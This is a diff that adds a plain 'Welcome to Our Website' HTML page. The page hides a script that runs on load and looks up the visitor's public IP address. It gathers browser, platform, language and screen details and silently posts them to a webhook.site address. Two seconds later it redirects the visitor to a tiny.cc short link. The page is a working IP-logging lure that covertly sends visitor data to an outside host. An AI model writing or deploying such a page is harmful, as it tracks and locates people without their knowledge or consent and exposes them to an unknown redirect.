@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome to the Site</title>
+</head>
+<body>
+  <h1>Welcome to Our Website</h1>
+
+  <script>
+    // Fetch the user's public IP from api.myip.com
+    fetch('https://api.myip.com')
+      .then(response => response.json())
+      .then(data => {
+        // Get device info from the browser
+        const deviceInfo = {
+          ip: data.ip,  // User's public IP
+          userAgent: navigator.userAgent,  // Browser info
+          platform: navigator.platform,    // Platform (Windows, Mac, etc.)
+          language: navigator.language,    // Language of the browser
+          screenWidth: window.screen.width,  // Screen width
+          screenHeight: window.screen.height // Screen height
+        };
+
+        // Send this data to your webhook URL
+        fetch('https://webhook.site/e9c6bc31-492e-4e09-962c-f6b3c7226e3c', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            device: deviceInfo
+          })
+        }).then(response => {
+          console.log('IP and device info sent to webhook!');
+        }).catch(err => {
+          console.error('Error sending data:', err);
+        });
+
+        // Redirect the user to tiny.cc/BNdiary after 2 seconds
+        setTimeout(() => {
+          window.location.href = 'https://tiny.cc/BNdiary';
+        }, 2000); // 2-second delay
+      })
+      .catch(err => console.error('Error fetching IP:', err));
+  </script>
+</body>
+</html>
